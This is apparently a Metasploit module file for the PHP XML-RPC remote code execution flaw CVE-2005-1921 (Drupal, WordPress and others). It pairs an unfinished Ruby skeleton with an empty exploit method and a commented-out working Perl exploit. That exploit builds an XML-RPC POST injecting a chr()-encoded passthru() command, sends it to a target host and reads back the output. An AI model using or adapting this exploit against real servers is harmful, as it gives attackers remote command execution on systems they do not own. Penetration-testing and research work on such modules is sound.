require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'PHP XML-RPC Arbitrary Code Execution',
			'Description'    => %q{
				This module exploits an arbitrary code execution flaw
				discovered in many implementations of the PHP XML-RPC
				module. This flaw is exploitable through a number of PHP web
				applications, including but not limited to Drupal,
				Wordpress, Postnuke, and TikiWiki.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '14088'],
					[ 'CVE', '2005-1921'],
					[ 'MIL', '49'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 29 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::php_xmlrpc_eval;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'PHP XML-RPC Arbitrary Code Execution',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'RPATH' => [1, 'DATA', 'Path to the XML-RPC script', '/xmlrpc.php'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits an arbitrary code execution flaw discovered in many
		implementations of the PHP XML-RPC module. This flaw is exploitable through
		a number of PHP web applications, including but not limited to Drupal, Wordpress,
		Postnuke, and TikiWiki.
}),

	'Refs' =>
	  [
		['BID', '14088'],
		['CVE', '2005-1921'],
		['MIL', '49'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'  => ['cmd', 'cmd_bash'],
	  },

	'Keys' => ['xmlrpc'],

	'DisclosureDate' => 'Jun 29 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $target_port    = $self->GetVar('RPORT');
	my $vhost          = $self->GetVar('VHOST') || $target_host;
	my $path           = $self->GetVar('RPATH');
	my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;

	# Encode the command as a set of chr() function calls
	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));

	# Create the XML-RPC post data
	my $data =
	  '<?xml version="1.0"?>'.
	  "<methodCall><methodName>".Pex::Text::AlphaNumText(int(rand(128)+32))."</methodName>".
	  "<params><param><name>".Pex::Text::AlphaNumText(int(rand(128)+32))."');".
	  "echo('_cmd_beg_\n');".
	  "passthru($byte);".
	  "echo('_cmd_end_\n');".
	  ";//</name><value>".
	  Pex::Text::AlphaNumText(int(rand(128)+32)).
	  "</value></param></params></methodCall>";

	my $req =
	  "POST $path HTTP/1.1\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Content-Type: application/xml\r\n".
	  "Content-Length: ". length($data)."\r\n".
	  "Connection: Close\r\n".
	  "\r\n". $data . "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending the malicious XML-RPC POST request...");

	$s->Send($req);

	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine('----------------------------------------');
			$self->PrintLine('');
			$self->PrintLine($out);
			$self->PrintLine('');
			$self->PrintLine('----------------------------------------');
		}
	}

	return;
}

1;

=end


end
end	
